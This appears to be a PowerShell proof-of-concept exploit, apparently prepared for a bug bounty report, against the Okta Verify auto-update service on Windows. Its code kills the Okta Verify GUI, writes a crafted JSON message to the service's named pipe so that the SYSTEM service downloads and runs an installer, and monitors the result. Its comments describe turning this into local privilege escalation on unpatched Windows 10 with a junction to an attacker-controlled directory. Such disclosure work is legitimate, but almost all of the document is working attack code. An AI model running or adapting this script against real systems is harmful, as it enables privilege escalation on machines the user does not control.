# Okta Verify Auto-Update: Unprivileged User Triggers SYSTEM Download + Execution
#
# WHAT THIS DOES:
# A standard (non-admin) user sends a crafted JSON message to the Okta Coordinator
# Service's named pipe. The SYSTEM service then:
#   1. Makes an HTTPS request to the Okta artifacts API
#   2. Downloads a 36+ MB installer to a temp directory
#   3. Validates the Authenticode signature
#   4. Executes the installer as NT AUTHORITY\SYSTEM
#
# PREREQUISITES:
# - Okta Verify installed (tested on 6.6.2, triggers upgrade to 6.7.1)
# - "Okta Auto Update Service" running (it starts automatically)
# - OktaVerify GUI must NOT be running (it consumes the single pipe instance)
# - No update check in the last hour (1hr retry cache; restart service to clear)
#
# PARAMETERS:
# - ArtifactType: WINDOWS_OKTA_VERIFY (not "OktaVerify" - API returns 404 for that)
# - AutoUpdateUrl: must end with trailing slash (string concat bug)
# - BucketId: "0" (only bucket returning 200 on most orgs; 1-19 return 404)
# - CurrentInstalledVersion: low version to guarantee newer version exists
#
# For TOCTOU LPE on Win10 (pre-KB5017308), create a junction at
# C:\Windows\Temp\Okta-AutoUpdate -> attacker-controlled directory before running.
# On Win11/patched Win10, SYSTEM temp is C:\WINDOWS\SystemTemp (locked to SYSTEM).

param(
    [string]$OktaOrg = "https://bugcrowd-pam-4593.oktapreview.com/",
    [string]$BucketId = "0",
    [int]$MonitorSeconds = 90
)

# Step 1: Kill OktaVerify GUI (runs in user context, no elevation needed)
# The pipe has maxNumberOfServerInstances=1 - GUI holds the only slot
Stop-Process -Name OktaVerify -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# Step 2: Ensure service is running and pipe is available
$svc = Get-Service "Okta Auto Update Service" -ErrorAction SilentlyContinue
if ($svc.Status -ne "Running") {
    Write-Host "[-] Service not running. Attempting start (requires admin)..."
    Start-Service "Okta Auto Update Service" -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 8
}

# Verify pipe exists
if (!(Test-Path "\\.\pipe\Okta.Coordinator.pipe")) {
    Write-Host "[-] Pipe not found. Service may need time to initialize."
    Start-Sleep -Seconds 5
    if (!(Test-Path "\\.\pipe\Okta.Coordinator.pipe")) {
        Write-Host "[-] FATAL: Okta.Coordinator.pipe does not exist"
        exit 1
    }
}

$svcPid = (Get-Process "Okta.Coordinator.Service" -ErrorAction SilentlyContinue).Id
Write-Host "[*] Service PID: $svcPid"

# Step 3: Construct and send IPCMessage
$json = @"
{"ArtifactType":"WINDOWS_OKTA_VERIFY","AutoUpdateUrl":"$OktaOrg","BucketId":"$BucketId","CurrentInstalledVersion":{"_Build":0,"_Major":1,"_Minor":0,"_Revision":0},"EventLogName":"Okta Verify","EventSourceName":"OktaUpdate","PipeName":"","ReleaseChannel":"GA","UserId":null}
"@

Write-Host "[*] Sending IPCMessage to Okta.Coordinator.pipe..."
Write-Host "[*] AutoUpdateUrl: $OktaOrg"
Write-Host "[*] BucketId: $BucketId"

try {
    $pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".", "Okta.Coordinator.pipe", [System.IO.Pipes.PipeDirection]::InOut)
    $pipe.Connect(5000)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $pipe.Write($bytes, 0, $bytes.Length)
    $pipe.Flush()
    $pipe.Close()
    Write-Host "[+] Sent $($bytes.Length) bytes"
} catch {
    Write-Host "[-] FAILED to send: $_"
    Write-Host "[-] Is OktaVerify GUI still running? Kill it first."
    exit 1
}

# Step 4: Monitor for download
Write-Host ""
Write-Host "=== Monitoring for SYSTEM download ($MonitorSeconds seconds) ==="

# Check both possible temp paths (Win11 SystemTemp vs Win10 Temp)
$sysTemp = "$env:SystemRoot\SystemTemp\Okta-AutoUpdate"
$winTemp = "$env:SystemRoot\Temp\Okta-AutoUpdate"
$found = $false

for ($i = 1; $i -le $MonitorSeconds; $i++) {
    Start-Sleep -Seconds 1

    # Check network activity in first 10 seconds
    if ($i -le 10 -and $svcPid) {
        $conns = netstat -ano 2>$null | Select-String "$svcPid" | Select-String "ESTABLISHED"
        if ($conns) { Write-Host "  [${i}s] NET: $($conns.Count) active connections" }
    }

    # Check both temp directories
    foreach ($dir in @($sysTemp, $winTemp)) {
        if (Test-Path $dir) {
            $items = Get-ChildItem $dir -Recurse -ErrorAction SilentlyContinue
            if ($items) {
                Write-Host ""
                Write-Host "[+] FILES FOUND at ${i}s in $dir"
                foreach ($f in $items) {
                    Write-Host "    $($f.FullName) ($($f.Length) bytes)"
                }
                $exes = $items | Where-Object { $_.Extension -eq ".exe" }
                if ($exes) {
                    foreach ($exe in $exes) {
                        Write-Host ""
                        Write-Host "[+] === EXECUTABLE DOWNLOADED AND EXECUTED BY SYSTEM ==="
                        Write-Host "[+] Path: $($exe.FullName)"
                        Write-Host "[+] Size: $([Math]::Round($exe.Length/1MB, 2)) MB"
                        $sig = Get-AuthenticodeSignature $exe.FullName -ErrorAction SilentlyContinue
                        if ($sig) {
                            Write-Host "[+] Signature: $($sig.Status)"
                            Write-Host "[+] Signer: $($sig.SignerCertificate.Subject)"
                        }
                        $found = $true
                    }
                }
            }
        }
    }

    # Check version upgrade periodically
    if ($i % 15 -eq 0) {
        $ver = (Get-Item "C:\Program Files\Okta\Okta Verify\OktaVerify.exe" -ErrorAction SilentlyContinue).VersionInfo.FileVersion
        Write-Host "  [${i}s] Current OktaVerify version: $ver"
    }

    if ($i % 10 -eq 0 -and $i -lt $MonitorSeconds -and !$found) { Write-Host "  [$i/$MonitorSeconds]..." }
}

Write-Host ""
Write-Host "=== Final state ==="
$ver = (Get-Item "C:\Program Files\Okta\Okta Verify\OktaVerify.exe" -ErrorAction SilentlyContinue).VersionInfo.FileVersion
Write-Host "OktaVerify version: $ver"
Write-Host "Service running: $((Get-Process 'Okta.Coordinator.Service' -ErrorAction SilentlyContinue) -ne $null)"
Write-Host "Pipe exists: $(Test-Path '\\.\pipe\Okta.Coordinator.pipe')"

if (!$found) {
    Write-Host ""
    Write-Host "[!] No download detected. Possible causes:"
    Write-Host "    - 1-hour retry cache active (restart service to clear)"
    Write-Host "    - OktaVerify GUI was running (consumed the pipe instance)"
    Write-Host "    - BucketId mismatch (try 0 through 19)"
    Write-Host "    - Already on latest version"
}
